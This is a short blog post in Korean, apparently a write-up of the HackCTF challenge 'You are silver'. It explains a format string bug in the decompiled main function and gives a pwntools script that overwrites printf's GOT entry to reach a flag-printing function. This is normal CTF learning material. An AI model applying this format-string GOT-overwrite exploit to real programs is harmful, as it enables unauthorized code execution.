---
title: "[HackCTF]You are silver"
date: 2020-1-27
tags: [HackCTF]
categories: [HackCTF]
---

main에서 fsb일어난다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-30h]
  int v5; // [rsp+28h] [rbp-8h]
  int v6; // [rsp+2Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v6 = 50;
  puts("Please enter your name");
  fgets(&s, 46, stdin);
  printf(&s, 46LL);
  v5 = get_tier(v6);
  printf(v5);
  return 0;
}
```



printf(v5) -> play_game(4); 이런식으로 바꿔주면 play_game 함수 내부에서  `system("cat ./flag");`  할 수 있다.

stack offset 6번째부터 입력받으니까 %8$ln해주고 8번째 오프셋에는 printf@got로 해놓으면 앞에서 출력된만큼 스택 8번째인 printf@got를 덮을 수 있다.

stack offset 6 : %6295592 

stack offset 7 : c%8$ln + '\x00\x00'

stack offset 8 : printf@got

> exploit.py

```python
from pwn import *

e = ELF('./you_are_silver')
#p = process('./you_are_silver')
p = remote('ctf.j0n9hyun.xyz',3022)
play_game = 0x4006d7
printf_got = 0x601028

offset = 6

# printf@got -> play_game
payload = '%{}c'.format(play_game)
payload += '%8$ln'
payload += '\x00' * (8-len(payload)%8)
payload += p64(e.got['printf']) # 8
payload = payload.ljust(46,'Z')

p.sendlineafter('name\n',payload)

p.interactive()
```